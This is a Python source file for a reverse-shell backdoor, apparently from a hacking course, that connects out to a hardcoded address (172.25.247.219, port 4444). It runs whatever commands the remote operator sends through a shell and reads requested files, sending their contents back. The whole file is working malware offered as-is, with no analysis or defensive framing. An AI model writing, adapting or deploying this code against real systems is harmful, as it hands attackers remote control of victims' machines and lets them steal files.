import socket
import subprocess
import json
import os 

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        # self.connection.send(b'Hello, Server!\n')

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data.decode() if isinstance(data, bytes) else data)
            self.connection.send(json_data.encode())
        except Exception as e:
            print(f"Error in reliable_send: {e}")

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(4096).decode()
                return json.loads(json_data)
            except json.JSONDecodeError as e:
                print(f"JSON decode error: {e}")
                continue

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            return f"Command failed: {e.output.decode()}".encode()

    def change_working_directory(self, path):
        try:
            os.chdir(path)
            return f"Changed directory to {path}\n".encode()
        except FileNotFoundError as e:
            return f"Directory not found: {e}\n".encode()
        except Exception as e:
            return f"Error changing directory: {e}\n".encode()

    def read_file(self , path):
        with open(path, "rb") as file:
            return file.read()

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory(command[1]) 
            elif command[0] == "download":
                command_result = self.read_file(command[1])       
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)    



my_backdoor = Backdoor("172.25.247.219", 4444)
my_backdoor.run()